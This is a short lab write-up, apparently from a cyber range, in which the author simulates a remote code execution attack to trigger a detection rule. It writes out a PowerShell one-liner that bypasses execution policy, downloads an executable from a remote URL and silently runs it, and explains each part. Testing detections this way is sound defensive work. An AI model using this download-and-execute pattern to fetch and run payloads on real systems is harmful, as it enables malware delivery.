# Attack Simulation

## 1. Simulating the RCE Attack

To test the detection rule, I simulated a Remote Code Execution (RCE) attack by executing the following PowerShell command:

```bash
cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri 'https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe' -OutFile C:\ProgramData\7z2408-x64.exe; Start-Process 'C:\programdata\7z2408-x64.exe' -ArgumentList '/S' -Wait"
```
### Explanation of the Command

- **`cmd.exe /c`**: Executes a command using the Windows command prompt.
- **`powershell.exe -ExecutionPolicy Bypass -NoProfile`**: Runs PowerShell with settings to bypass execution policies and avoid profile loading.
- **`Invoke-WebRequest`**: Downloads the 7-Zip installer from a remote server.
- **`Start-Process`**: Executes the downloaded file silently with the `/S` argument for a silent installation.

This simulation emulates an attacker using PowerShell to download and execute a file, triggering the detection rule that was previously set up.
